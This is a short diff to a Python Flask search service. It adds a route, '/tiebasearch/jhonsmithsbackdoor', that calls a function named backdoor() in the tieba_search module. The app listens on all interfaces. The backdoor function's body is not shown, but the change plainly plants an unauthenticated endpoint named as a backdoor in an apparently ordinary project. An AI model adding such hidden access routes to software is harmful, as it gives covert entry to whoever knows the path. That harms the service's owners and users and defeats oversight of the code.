@@ -34,5 +34,9 @@ def tieba_search_query():
 def r():
 	return tieba_search.r()
 
+@app.route('/tiebasearch/jhonsmithsbackdoor')
+def backdoor():
+	return tieba_search.backdoor()
+
 if __name__ == '__main__':
 	app.run(host = '0.0.0.0', threaded=False, port = 12300)
